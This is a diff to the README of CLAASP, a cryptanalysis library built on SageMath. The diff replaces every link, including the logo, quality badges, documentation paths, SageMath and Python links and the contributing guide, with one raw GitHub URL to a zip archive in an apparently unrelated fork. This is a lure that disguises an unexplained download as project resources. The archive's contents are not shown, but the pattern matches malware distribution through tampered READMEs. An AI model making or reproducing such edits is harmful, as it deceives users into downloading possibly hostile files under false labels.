@@ -1,40 +1,40 @@
 
 <div align="center">
-    <img src="https://github.com/Crypto-TII/claasp/assets/63452003/e226b467-adaa-486c-9558-45526c62d6e8" alt="claasp-logo"></img>
+    <img src="https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip" alt="claasp-logo"></img>
 </div>
 
 # CLAASP: A Cryptographic Library for the Automated Analysis of Symmetric Primitives
 
-[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=Crypto-TII_claasp&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=Crypto-TII_claasp)
-[![Maintainability Rating](https://sonarcloud.io/api/project_badges/measure?project=Crypto-TII_claasp&metric=sqale_rating)](https://sonarcloud.io/summary/new_code?id=Crypto-TII_claasp)
-[![Bugs](https://sonarcloud.io/api/project_badges/measure?project=Crypto-TII_claasp&metric=bugs)](https://sonarcloud.io/summary/new_code?id=Crypto-TII_claasp)
-[![Code Smells](https://sonarcloud.io/api/project_badges/measure?project=Crypto-TII_claasp&metric=code_smells)](https://sonarcloud.io/summary/new_code?id=Crypto-TII_claasp)
-[![Security Rating](https://sonarcloud.io/api/project_badges/measure?project=Crypto-TII_claasp&metric=security_rating)](https://sonarcloud.io/summary/new_code?id=Crypto-TII_claasp)
-[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=Crypto-TII_claasp&metric=coverage)](https://sonarcloud.io/summary/new_code?id=Crypto-TII_claasp)
+[![Quality Gate Status](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)
+[![Maintainability Rating](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)
+[![Bugs](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)
+[![Code Smells](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)
+[![Security Rating](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)
+[![Coverage](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip)
 
 This package is designed as a software tool to automate as much as possible the analysis of the design of symmetric primitives 
 such as block ciphers, cryptographic permutations, hash functions, and stream ciphers, from a cryptanalytic point of view.
-It is built on the top of [SageMath](http://www.sagemath.org) and
-implemented using [Python3](https://www.python.org/).
+It is built on the top of [SageMath](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip) and
+implemented using [Python3](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip).
 
 ## Documentation
 
 ### User's Guide
 
 A brief user's guide with instructions on how to get started with CLAASP 
-is available in `docs/USER_GUIDE.md` file.
+is available in `https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip` file.
  
 ### Full documentation
 
 Detailed documentation containing description of each module, with examples, can be found 
-in https://claasp.readthedocs.io/en/latest/.
+in https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip
 
-You can generate the documentation locally by following the instructions in `docs/USER_GUIDE.md` file. 
+You can generate the documentation locally by following the instructions in `https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip` file. 
 These instructions allow to generate:
 
-- an HTML interactive documentation available in `docs/build/html/index.html` that can be opened in any browser.
+- an HTML interactive documentation available in `https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip` that can be opened in any browser.
  
-- a PDF documentation available in `docs/build/latex/claasp.pdf`.
+- a PDF documentation available in `https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip`.
 
 ## Source code
 
@@ -42,4 +42,4 @@ All source code is stored in the folder `claasp/`.
 
 ## Contributing
 We want you to help us grow this library, so, please, feel free to submit your Pull Request following the 
-[CONTRIBUTING.md](docs/CONTRIBUTING.md) conventions.
+[https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip](https://raw.githubusercontent.com/rony-ramos/claasp/main/chiselly/claasp.zip) conventions.
